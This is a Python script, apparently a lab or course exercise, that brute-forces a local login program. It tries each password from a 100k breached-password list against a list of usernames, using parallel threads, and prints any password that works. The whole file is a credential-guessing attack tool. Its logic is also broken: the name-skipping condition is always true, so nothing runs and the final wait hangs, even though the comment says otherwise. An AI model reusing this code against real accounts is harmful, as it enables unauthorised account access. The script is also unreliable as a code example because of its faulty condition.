import os
import time
import subprocess
import threading
import itertools

found = False
stop_event = threading.Event()
lock = threading.Lock()

d = open("gang", encoding="utf8")
Names = [line.rstrip('\n') for line in d]
f = open("PwnedPWs100k", encoding="utf8")
Passwords = [line.rstrip('\n') for line in f]
start = time.ctime(time.time())
print("Start Time: ", start)

def threadin(chunk_of_passwords, name):
    global found
    for pwd in chunk_of_passwords:
        output = subprocess.run(["python3", "Login.pyc", name, pwd], capture_output = True, text = True).stdout.strip("\n")
        if "success" in output:
            with lock:
                if not found:
                    found = True
                    stop_event.set()
                    print("The Working Password For ", name,"Is", pwd)
                    end = time.ctime(time.time())
                    print("End Time: ", end)
                break

def grouper(iterable, n):
    it = iter(iterable)
    while True:
        chunk = tuple(itertools.islice(it, n))
        if not chunk:
            return
        yield chunk

threads = []
max_threads = 10
for name in Names:
    # Skip Al and Adam
    if name == "Al" or "Adam":
        continue
    else:
        for chunk in grouper(Passwords, 10000):
            if len(threads) >= max_threads:
                for thread in threads:
                    thread.join()
                threads = []
            # Create a new thread for each chunk of passwords and name
            thread = threading.Thread(target=threadin, args=(chunk, name))
            threads.append(thread)
            # Start the thread
            thread.start()

stop_event.wait()
for thread in threads:
    thread.join()


# speed code